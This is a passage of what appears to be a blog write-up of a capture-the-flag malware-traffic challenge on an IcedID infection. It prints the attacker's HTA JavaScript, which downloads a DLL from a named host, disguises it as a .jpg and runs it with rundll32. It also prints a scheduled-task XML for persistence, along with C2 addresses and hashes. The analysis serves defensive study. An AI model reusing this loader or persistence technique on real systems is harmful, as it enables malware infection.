+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Javascript" data-lang="Javascript"><span style="color:#a6e22e">dateIntegerR</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;msxml2.xmlhttp&#34;</span>);<span style="color:#a6e22e">dateIntegerR</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;hxxp //coursemcclurez.com/adda/T/5xBOnOkAQixWY7/JQNizzLtuT6BVV0xRecCKVVHAAR6PkgGrIPN/sose5?user=anRsIkfbv&amp;time=0qobcg4DyUX11ZLF5yHrIevFn&amp;page=1K2n8iJ&amp;i9y9SwJu=yVaCtZ9s0gUfn&amp;q=hj9xWh4I6PDdXOPDey&amp;id=Vr4pf&amp;user=mHMoD292T&amp;search=uZVgg21LyVRFdD2FABGZvQlnkM90&amp;q=Dwc1s67MbWC24TGoOjMXC&#34;</span>, <span style="color:#66d9ef">false</span>);<span style="color:#a6e22e">dateIntegerR</span>.<span style="color:#a6e22e">send</span>();<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">dateIntegerR</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>){<span style="color:#66d9ef">try</span>{<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">varLst</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;adodb.stream&#34;</span>);<span style="color:#a6e22e">varLst</span>.<span style="color:#a6e22e">open</span>;<span style="color:#a6e22e">varLst</span>.<span style="color:#a6e22e">type</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;<span style="color:#a6e22e">varLst</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">dateIntegerR</span>.<span style="color:#a6e22e">responsebody</span>);<span style="color:#a6e22e">varLst</span>.<span style="color:#a6e22e">savetofile</span>(<span style="color:#e6db74">&#34;c:\users\public\collectionBoxConst.jpg&#34;</span>, <span style="color:#ae81ff">2</span>);<span style="color:#a6e22e">varLst</span>.<span style="color:#a6e22e">close</span>;}<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){}}
+
+<span style="color:#a6e22e">trustReferenceConst</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;wscript.shell&#34;</span>);<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">bytesLStruct</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;scripting.filesystemobject&#34;</span>);<span style="color:#a6e22e">trustReferenceConst</span>.<span style="color:#a6e22e">run</span>(<span style="color:#e6db74">&#34;rundll32 c:\users\public\collectionBoxConst.jpg,PluginInit&#34;</span>);<span style="color:#66d9ef">try</span>{<span style="color:#a6e22e">repoVObject</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">trustReferenceConst</span>.<span style="color:#a6e22e">CurrentDirectory</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\collectionBoxConst.hta&#34;</span>;<span style="color:#a6e22e">bytesLStruct</span>.<span style="color:#a6e22e">deletefile</span>(<span style="color:#a6e22e">repoVObject</span>);}<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">indexIndexNext</span>){}
+</code></pre></div><p>The first half will:</p>
+<ul>
+<li>Make a GET request to hxxp //coursemcclurez.com/adda/T/5xBOnOkAQixWY7/JQNizzLtuT6BVV0xRecCKVVHAAR6PkgGrIPN/sose5?user=anRsIkfbv&amp;time=0qobcg4DyUX11ZLF5yHrIevFn&amp;page=1K2n8iJ&amp;i9y9SwJu=yVaCtZ9s0gUfn&amp;q=hj9xWh4I6PDdXOPDey&amp;id=Vr4pf&amp;user=mHMoD292T&amp;search=uZVgg21LyVRFdD2FABGZvQlnkM90&amp;q=Dwc1s67MbWC24TGoOjMXC</li>
+<li>Then save the response data from the GET request to a file located at <code>C:\Users\Public\collectionBoxConst.jpg</code></li>
+</ul>
+<p>The second half will:</p>
+<ul>
+<li>Execute the commandline: <code>rundll32 C:\Users\Public\collectionBoxConst.jpg,PluginInit</code></li>
+<li>Delete the <code>collectionBoxConst.hta</code> file</li>
+</ul>
+<p>The apparent <code>.jpg</code> file clearly isn&rsquo;t a <code>.jpg</code> file, but rather a <em>Dynamic Link Library</em> (<code>.dll</code>) file. This can further be confirmed by running the <code>file</code> utility on the file, which returns:</p>
+<p><code>PE32+ executable (DLL) (GUI) x86-64, for MS Windows</code></p>
+<ol start="5">
+<li>What is the image file dll installer sha256 hash from previous question?</li>
+</ol>
+<p><code>51658887e46c88ed6d5861861a55c989d256a7962fb848fe833096ed6b049441</code></p>
+<p>This question is referring to the <code>.dll</code> file with the <code>.jpg</code> file extension which was downloaded.</p>
+<p>We can determine the sha256 hash by running this command in Linux:</p>
+<p><code>sha256sum &lt;filename&gt;.dll</code></p>
+<ol start="6">
+<li>What are the IP address and its domain name hosted installer DLL?</li>
+</ol>
+<p><code>45.142.213.105, coursemcclurez.com</code></p>
+<p>This question is asking about the domain and IP address that the <code>collectionBoxConst.dll</code> file was downloaded from. Recall that the full URL was:</p>
+<p><code>hxxp //coursemcclurez.com/adda/T/5xBOnOkAQixWY7/JQNizzLtuT6BVV0xRecCKVVHAAR6PkgGrIPN/sose5?user=anRsIkfbv&amp;time=0qobcg4DyUX11ZLF5yHrIevFn&amp;page=1K2n8iJ&amp;i9y9SwJu=yVaCtZ9s0gUfn&amp;q=hj9xWh4I6PDdXOPDey&amp;id=Vr4pf&amp;user=mHMoD292T&amp;search=uZVgg21LyVRFdD2FABGZvQlnkM90&amp;q=Dwc1s67MbWC24TGoOjMXC</code></p>
+<p>So we know the domain is: <code>coursemcclurez[.]com</code></p>
+<p>And if we input this into VirusTotal:</p>
+<p><img src="https://i.imgur.com/WYUneba.png" alt=""></p>
+<p>Now we have the IP address!</p>
+<ol start="7">
+<li>What is the full URL for the DLL installer?</li>
+</ol>
+<p><code>hxxp //coursemcclurez.com/adda/T/5xBOnOkAQixWY7/JQNizzLtuT6BVV0xRecCKVVHAAR6PkgGrIPN/sose5?user=anRsIkfbv&amp;time=0qobcg4DyUX11ZLF5yHrIevFn&amp;page=1K2n8iJ&amp;i9y9SwJu=yVaCtZ9s0gUfn&amp;q=hj9xWh4I6PDdXOPDey&amp;id=Vr4pf&amp;user=mHMoD292T&amp;search=uZVgg21LyVRFdD2FABGZvQlnkM90&amp;q=Dwc1s67MbWC24TGoOjMXC</code></p>
+<ol start="8">
+<li>What are the two IP addresses identified as C2 servers?</li>
+</ol>
+<p><code>185.33.85.35, 194.5.249.46</code></p>
+<p>If we filter for only <code>dns</code> packets in the packet capture, we can see that there&rsquo;s a lot more domains than the <code>coursemcclurez[.]com</code> being queried:</p>
+<p><img src="https://i.imgur.com/oP2qPoQ.png" alt=""></p>
+<p>Many of the domains are being resolved to the IP address <code>185.33.85.35</code>, and we were already aware of the <code>45.142.213.105</code> domain which is associated to <code>coursemcclurez[.]com</code>.</p>
+<p>This only leaves 3 other potential C2 server IP addresses:</p>
+<ul>
+<li><code>172.67.169.59</code></li>
+<li><code>194.5.249.46</code></li>
+<li><code>65.8.218.70</code></li>
+</ul>
+<p>The two which appear suspicious due to the domains they&rsquo;re associated with are <code>172.67.169.59</code> (<code>supplementik[.]top</code>) &amp; <code>194.5.249.46</code> (<code>extrimefigim[.]top</code>)</p>
+<p>After trying both IP addresses as answers, only <code>194.5.249.46</code> was accepted.</p>
+<ol start="9">
+<li>What are the four C2 domains identified in the PCAP file?</li>
+</ol>
+<p><code>arhannexa5.top, extrimefigim.top, fimlubindu.top, kilodaser4.fit</code></p>
+<p>We know that the C2 IP addresses are <code>185.33.85.35</code> &amp; <code>194.5.249.46</code>, so now we simply have to look through the captured DNS packets and search for domain queries which resolved to either of these C2 IP addresses. We can type <em>dns</em> into the search filter to only look at DNS packets:</p>
+<p><img src="https://i.imgur.com/OL2cSk0.png" alt=""></p>
+<ol start="10">
+<li>After the DLL installer being executed, what are the two domains that were being contacted by the installer DLL?</li>
+</ol>
+<p><code>aws.amazon.com, supplementik.top</code></p>
+<p>To solve this, we must look for when the DLL installer was downloaded, then look at the packets after this event occurred. We know that the domain that the DLL installer was downloaded from is <code>coursemcclurez[.]com</code>, and we know that the machine must request the IP address for this domain before it can download the DLL or contact the domain for anything, so we can start by looking for the packet which answered this DNS query packet, then looking at the packets after that DNS query was resolved:</p>
+<p><img src="https://i.imgur.com/GMiVLBP.png" alt=""></p>
+<p>Now we know that in packet 2, the DNS query is resolved. Now we can assume that after packet 2, the DLL is now downloaded and that every DNS query after packet 2 is going to occur after the DLL is executed.</p>
+<p>We see there&rsquo;s 2 more DNS queries:</p>
+<p><img src="https://i.imgur.com/fL1yaoN.png" alt=""></p>
+<p><img src="https://i.imgur.com/P9LVBUN.png" alt=""></p>
+<p>One for <code>aws.amazon[.]com</code> &amp; another for <code>supplementik[.]top</code>, both of which we can assume occurred after the DLL was downloaded and executed.</p>
+<ol start="11">
+<li>The malware generated traffic to an IP address over port 8080 with two SYN requests, what is the IP address?</li>
+</ol>
+<p><code>38.135.122.194</code></p>
+<p>This can be solved by looking at the <code>.pcap</code> capture file and entering: <code>tcp.port == 8080</code> as a display filter which outputs:</p>
+<p><img src="https://i.imgur.com/wtBK8ey.png" alt=""></p>
+<p>And if we scroll through the packets displayed, we can determine that the only IP addresses associated with any communications on port 8080 are between <code>10.6.2.103</code> (The source) and <code>38.135.122.194</code> (The destination).</p>
+<ol start="12">
+<li>The license.dat file was used to create persistance on the user&rsquo;s machine, what is the dll run method for the persistance?</li>
+</ol>
+<p><code>C:\Users\user1\AppData\Local\user1\Tetoomdu64.dll&quot;,update /i:&quot;ComicFantasy\license.dat</code></p>
+<p>The contents of <code>2021-06-02-scheduled-task.txt</code> will point us in the correct direction for this question:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-16&#34;?&gt;</span>
+<span style="color:#f92672">&lt;Task</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.2&#34;</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://schemas.microsoft.com/windows/2004/02/mit/task&#34;</span><span style="color:#f92672">&gt;</span>
+  <span style="color:#f92672">&lt;RegistrationInfo&gt;</span>
+    <span style="color:#f92672">&lt;URI&gt;</span>\{B9C2BAC4-FDCF-449C-896A-9BEA1C23FBE8}<span style="color:#f92672">&lt;/URI&gt;</span>
+  <span style="color:#f92672">&lt;/RegistrationInfo&gt;</span>
+  <span style="color:#f92672">&lt;Triggers&gt;</span>
+    <span style="color:#f92672">&lt;TimeTrigger</span> <span style="color:#a6e22e">id=</span><span style="color:#e6db74">&#34;TimeTrigger&#34;</span><span style="color:#f92672">&gt;</span>
+      <span style="color:#f92672">&lt;Repetition&gt;</span>
+        <span style="color:#f92672">&lt;Interval&gt;</span>PT1H<span style="color:#f92672">&lt;/Interval&gt;</span>
+        <span style="color:#f92672">&lt;StopAtDurationEnd&gt;</span>false<span style="color:#f92672">&lt;/StopAtDurationEnd&gt;</span>
+      <span style="color:#f92672">&lt;/Repetition&gt;</span>
+      <span style="color:#f92672">&lt;StartBoundary&gt;</span>2012-01-01T12:00:00<span style="color:#f92672">&lt;/StartBoundary&gt;</span>
+      <span style="color:#f92672">&lt;Enabled&gt;</span>true<span style="color:#f92672">&lt;/Enabled&gt;</span>
+    <span style="color:#f92672">&lt;/TimeTrigger&gt;</span>
+    <span style="color:#f92672">&lt;LogonTrigger</span> <span style="color:#a6e22e">id=</span><span style="color:#e6db74">&#34;LogonTrigger&#34;</span><span style="color:#f92672">&gt;</span>
+      <span style="color:#f92672">&lt;Enabled&gt;</span>true<span style="color:#f92672">&lt;/Enabled&gt;</span>
+      <span style="color:#f92672">&lt;UserId&gt;</span>user1<span style="color:#f92672">&lt;/UserId&gt;</span>
+    <span style="color:#f92672">&lt;/LogonTrigger&gt;</span>
+  <span style="color:#f92672">&lt;/Triggers&gt;</span>
+  <span style="color:#f92672">&lt;Settings&gt;</span>
+    <span style="color:#f92672">&lt;MultipleInstancesPolicy&gt;</span>IgnoreNew<span style="color:#f92672">&lt;/MultipleInstancesPolicy&gt;</span>
+    <span style="color:#f92672">&lt;DisallowStartIfOnBatteries&gt;</span>false<span style="color:#f92672">&lt;/DisallowStartIfOnBatteries&gt;</span>
+    <span style="color:#f92672">&lt;StopIfGoingOnBatteries&gt;</span>false<span style="color:#f92672">&lt;/StopIfGoingOnBatteries&gt;</span>
+    <span style="color:#f92672">&lt;AllowHardTerminate&gt;</span>false<span style="color:#f92672">&lt;/AllowHardTerminate&gt;</span>
+    <span style="color:#f92672">&lt;StartWhenAvailable&gt;</span>true<span style="color:#f92672">&lt;/StartWhenAvailable&gt;</span>
+    <span style="color:#f92672">&lt;RunOnlyIfNetworkAvailable&gt;</span>false<span style="color:#f92672">&lt;/RunOnlyIfNetworkAvailable&gt;</span>
+    <span style="color:#f92672">&lt;IdleSettings&gt;</span>
+      <span style="color:#f92672">&lt;Duration&gt;</span>PT10M<span style="color:#f92672">&lt;/Duration&gt;</span>
+      <span style="color:#f92672">&lt;WaitTimeout&gt;</span>PT1H<span style="color:#f92672">&lt;/WaitTimeout&gt;</span>
+      <span style="color:#f92672">&lt;StopOnIdleEnd&gt;</span>true<span style="color:#f92672">&lt;/StopOnIdleEnd&gt;</span>
+      <span style="color:#f92672">&lt;RestartOnIdle&gt;</span>false<span style="color:#f92672">&lt;/RestartOnIdle&gt;</span>
+    <span style="color:#f92672">&lt;/IdleSettings&gt;</span>
+    <span style="color:#f92672">&lt;AllowStartOnDemand&gt;</span>true<span style="color:#f92672">&lt;/AllowStartOnDemand&gt;</span>
+    <span style="color:#f92672">&lt;Enabled&gt;</span>true<span style="color:#f92672">&lt;/Enabled&gt;</span>
+    <span style="color:#f92672">&lt;Hidden&gt;</span>false<span style="color:#f92672">&lt;/Hidden&gt;</span>
+    <span style="color:#f92672">&lt;RunOnlyIfIdle&gt;</span>false<span style="color:#f92672">&lt;/RunOnlyIfIdle&gt;</span>
+    <span style="color:#f92672">&lt;WakeToRun&gt;</span>false<span style="color:#f92672">&lt;/WakeToRun&gt;</span>
+    <span style="color:#f92672">&lt;ExecutionTimeLimit&gt;</span>PT0S<span style="color:#f92672">&lt;/ExecutionTimeLimit&gt;</span>
+    <span style="color:#f92672">&lt;Priority&gt;</span>7<span style="color:#f92672">&lt;/Priority&gt;</span>
+  <span style="color:#f92672">&lt;/Settings&gt;</span>
+  <span style="color:#f92672">&lt;Actions</span> <span style="color:#a6e22e">Context=</span><span style="color:#e6db74">&#34;Author&#34;</span><span style="color:#f92672">&gt;</span>
+    <span style="color:#f92672">&lt;Exec&gt;</span>
+      <span style="color:#f92672">&lt;Command&gt;</span>rundll32.exe<span style="color:#f92672">&lt;/Command&gt;</span>
+      <span style="color:#f92672">&lt;Arguments&gt;</span>&#34;C:\Users\user1\AppData\Local\user1\Tetoomdu64.dll&#34;,update /i:&#34;ComicFantasy\license.dat&#34;<span style="color:#f92672">&lt;/Arguments&gt;</span>
+    <span style="color:#f92672">&lt;/Exec&gt;</span>
+  <span style="color:#f92672">&lt;/Actions&gt;</span>
+  <span style="color:#f92672">&lt;Principals&gt;</span>
+    <span style="color:#f92672">&lt;Principal</span> <span style="color:#a6e22e">id=</span><span style="color:#e6db74">&#34;Author&#34;</span><span style="color:#f92672">&gt;</span>
+      <span style="color:#f92672">&lt;UserId&gt;</span>LAPTOP-SH63S8O\user1<span style="color:#f92672">&lt;/UserId&gt;</span>
+      <span style="color:#f92672">&lt;LogonType&gt;</span>InteractiveToken<span style="color:#f92672">&lt;/LogonType&gt;</span>
+      <span style="color:#f92672">&lt;RunLevel&gt;</span>LeastPrivilege<span style="color:#f92672">&lt;/RunLevel&gt;</span>
+    <span style="color:#f92672">&lt;/Principal&gt;</span>
+  <span style="color:#f92672">&lt;/Principals&gt;</span>
+<span style="color:#f92672">&lt;/Task&gt;</span>
+</code></pre></div><p>This is an XML configuration file for a scheduled task, the <code>&lt;Exec&gt;</code> portion is what we should focus on:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;Exec&gt;</span>
+      <span style="color:#f92672">&lt;Command&gt;</span>rundll32.exe<span style="color:#f92672">&lt;/Command&gt;</span>
+      <span style="color:#f92672">&lt;Arguments&gt;</span>&#34;C:\Users\user1\AppData\Local\user1\Tetoomdu64.dll&#34;,update /i:&#34;ComicFantasy\license.dat&#34;<span style="color:#f92672">&lt;/Arguments&gt;</span>
+    <span style="color:#f92672">&lt;/Exec&gt;</span>
+</code></pre></div><p>This will set a scheduled task which will run <code>rundll32.exe &quot;C:\Users\user1\AppData\Local\user1\Tetoomdu64.dll&quot;,update /i:&quot;ComicFantasy\license.dat&quot;</code>. But our question is only interested in the arguments supplied to the executed command.</p>
+<ol start="13">
+<li>With OSINT, what is the malware family name used in this PCAP capture?</li>
+</ol>
+<p><code>IcedID</code></p>
+<p>This can be determined by taking an MD5 hash of the files (<code>.doc</code>, <code>.dll</code>, <code>.hta</code>) &amp; searching them on VirusTotal:</p>
+<p><img src="https://i.imgur.com/xt9cDf5.png" alt=""></p>
+<p><img src="https://i.imgur.com/lLW26oR.png" alt=""></p>
+<p><img src="https://i.imgur.com/yGD5eNA.png" alt=""></p>
+<p>The general consensus of VirusTotal is that this malware belongs to the IcedID family. This can be further confirmed by the challenge name.</p>
+<ol start="14">
+<li>Based on Palo Alto Unit 42, what is the APT Group name?</li>
+</ol>
+<p><code>TA551</code></p>
+<p>This can be found by simply searching &ldquo;Palo Alto Unit 42 IcedID Malware&rdquo; on your favorite search engine!</p>
+<ol start="15">
+<li>What is the Mitre Attack code for the initial access in this campaign?</li>
+</ol>
+<p><code>T1566.001</code></p>
+<p>Since we have the APT group name, <code>TA551</code>, we can search Mitre&rsquo;s ATT&amp;CK database which holds information regarding known threats and their tactics and techniques.</p>
+<p>Then we&rsquo;ll be presented with a table of the techniques employed by this group, then we have to find the one which matches up. According to the Palo Alto article, this infection begins wwith a malicious email which contains an attachment:</p>
+<p><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2021/01/word-image-15.jpeg" alt=""></p>
+<p>And if we scroll through the techniques employed by TA551, we see <em>Phishing: Spearphishing Attachment</em> which has an ID of T1566.001:</p>
+<p><img src="https://i.imgur.com/vEySoMA.png" alt=""></p>
+<p><em>NOTE: The description doesn&rsquo;t fit exactly with what we&rsquo;ve analyzed</em></p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/decalage2/oletools/wiki/olevba">https://github.com/decalage2/oletools/wiki/olevba</a></li>
+<li><a href="https://attack.mitre.org/software/S0483/">https://attack.mitre.org/software/S0483/</a></li>
+<li><a href="https://www.virustotal.com/gui/file/3ed5d0476d1ce4fd325666072983d295609fe94c5b65d5db47a53f462ac7a4dc">https://www.virustotal.com/gui/file/3ed5d0476d1ce4fd325666072983d295609fe94c5b65d5db47a53f462ac7a4dc</a></li>
+<li><a href="https://www.virustotal.com/gui/file/cc721111b5924cfeb91440ecaccc60ecc30d10fffbdab262f7c0a17027f527d1/behavior/C2AE">https://www.virustotal.com/gui/file/cc721111b5924cfeb91440ecaccc60ecc30d10fffbdab262f7c0a17027f527d1/behavior/C2AE</a></li>
+<li><a href="https://www.virustotal.com/gui/url/09023b31dcd25e698084fed4f683430d250bf473a1d717ba459a4cb68932c5df/detection">https://www.virustotal.com/gui/url/09023b31dcd25e698084fed4f683430d250bf473a1d717ba459a4cb68932c5df/detection</a></li>
+<li><a href="https://www.virustotal.com/gui/file/51658887e46c88ed6d5861861a55c989d256a7962fb848fe833096ed6b049441/detection">https://www.virustotal.com/gui/file/51658887e46c88ed6d5861861a55c989d256a7962fb848fe833096ed6b049441/detection</a></li>
+<li><a href="https://unit42.paloaltonetworks.com/ta551-shathak-icedid/">https://unit42.paloaltonetworks.com/ta551-shathak-icedid/</a></li>
+</ul>
+
+  </main>
+
+          
+            <footer role="contentinfo">
+  <div
+  
+  >
+    <label for="themer">
+      dark theme: <input type="checkbox" id="themer" class="vh">
+      
+      <span aria-hidden="true"></span>
+    </label>
+  </div>
+  
+    Checkout my <a href="https://github.com/1d8">Github!</a>
+  
+</footer>
+
+          
+        </div>
+      </div>
+    </div>
+    
+
+<script src="/js/dom-scripts.js"></script>  
+
+<script src="/js/prism.js"></script>
+
+
+
+<script src="/js/search.7aef046a0cc8b0c532f1d20087b920459bc868c936bb48a6ae221eceefca2d07.js"></script>
+
+<link rel="stylesheet" href="/css/search.fe0cd54a21628574bff49d721c827d1bb165ab56b0f22dd55ae78addbe61c309.css"></link>
+
+
+
+
+    
+    
+  
+
+  </body>
+</html>
